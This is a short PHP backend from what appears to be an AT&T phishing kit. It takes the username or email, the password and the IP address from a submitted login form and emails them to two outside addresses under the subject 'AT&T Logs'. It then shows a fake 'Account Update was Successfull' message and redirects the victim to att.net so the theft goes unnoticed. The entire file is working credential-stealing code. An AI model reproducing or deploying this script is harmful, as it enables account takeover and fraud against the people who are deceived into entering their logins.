<?

$ip = getenv("REMOTE_ADDR");
$message .= "--Hacked By Opa Dammy----\n";
$message .= "User or Email : ".$_POST['userid']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "--------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "----God is Able Amala----------------\n";



$recipient = "donnothmpson@gmail.com,sheldralkec@yahoo.com";
$subject = "AT&T Logs";
$headers = "From: AT&T";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "ATT", $message);
if (mail($recipient,$subject,$message,$headers))

{
?>
	
		   <script language=javascript>
alert('Account Update was Successfull!!!');
window.location='http://att.net';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>